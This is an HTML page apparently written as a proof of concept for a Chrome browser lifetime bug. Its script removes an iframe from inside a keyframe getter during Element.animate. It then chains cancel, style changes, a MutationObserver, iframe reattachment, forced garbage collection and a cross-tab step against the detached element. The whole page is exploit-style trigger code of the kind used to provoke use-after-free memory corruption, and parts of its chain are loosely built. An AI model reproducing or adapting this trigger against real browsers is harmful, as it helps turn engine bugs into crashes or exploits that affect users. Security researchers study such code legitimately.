<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<title>PoC Animation / Iframe Lifetime Edge Case</title>
<style>
body { font-family: Arial }
.box {
    width:100px;
    height:100px;
    background:blue;
    position:absolute;
    top:50%;
    left:50%;
}
</style>
</head>
<body>

<h1>Chrome Animation Lifetime PoC</h1>

<script>
function allociframe() {
    const iframe = document.createElement("iframe");
    iframe.width = iframe.height = 0;
    document.body.appendChild(iframe);
    return iframe;
}

function triggerAnimation() {
    const iframe = allociframe();
    const doc = iframe.contentDocument;
    const el = doc.createElement("div");
    el.className = "box";
    doc.body.appendChild(el);

    const keyframes = [];
    keyframes.__defineGetter__(0, () => {
        console.log("[getter] removing iframe during keyframe access");
        iframe.remove();
        return { transform: "translate3d(0,-200px,0)" };
    });

    const anim = el.animate(keyframes, {
        duration: 2000,
        iterations: Infinity
    });

    return { el, anim, iframe };
}

function chainOperations() {
    const { el, anim, iframe } = triggerAnimation();

    // 1️⃣ Cancel animation mid-flight
    setTimeout(() => {
        console.log("[chain] cancel animation");
        anim.cancel();
    }, 1000);

    // 2️⃣ Force style recalculation on detached node
    setTimeout(() => {
        console.log("[chain] style thrash");
        for (let i = 0; i < 100; i++) {
            el.style.transform = `translateX(${i}px)`;
        }
    }, 1500);

    // 3️⃣ MutationObserver on detached document
    setTimeout(() => {
        console.log("[chain] mutation observer attach");
        const mo = new MutationObserver(() => {
            console.log("[observer] mutation fired");
        });
        mo.observe(el, { attributes: true });
        el.setAttribute("data-test", "1");
    }, 2000);

    // 4️⃣ Re-attach iframe after animation lifecycle break
    setTimeout(() => {
        console.log("[chain] reattach iframe");
        document.body.appendChild(iframe);
    }, 2500);

    // 5️⃣ Force GC if exposed
    setTimeout(() => {
        console.log("[chain] attempting GC");
        if (window.gc) gc();
    }, 3000);

    // 6️⃣ Restart animation on possibly invalid state
    setTimeout(() => {
        console.log("[chain] restart animation");
        el.animate(
            [{ opacity: 0 }, { opacity: 1 }],
            { duration: 500 }
        );
    }, 3500);

    // 7️⃣ Triggering cross-tab behavior (simulation)
    setTimeout(() => {
        console.log("[chain] attempting to trigger tab interaction");
        try {
            let newTab = window.open('', '_blank');
            newTab.document.body.innerHTML = "<h1>Triggered from current tab</h1>";
            // Direct interaction between tabs through localStorage or message event
            window.localStorage.setItem("trigger", "cross-tab-action");
            newTab.addEventListener("storage", function() {
                console.log("Storage event triggered in another tab");
                newTab.document.body.innerHTML += "<p>Tab Interaction Detected</p>";
            });
        } catch (err) {
            console.error("Cross-tab interaction failed", err);
        }
    }, 4000);
}

chainOperations();
</script>

</body>
</html>
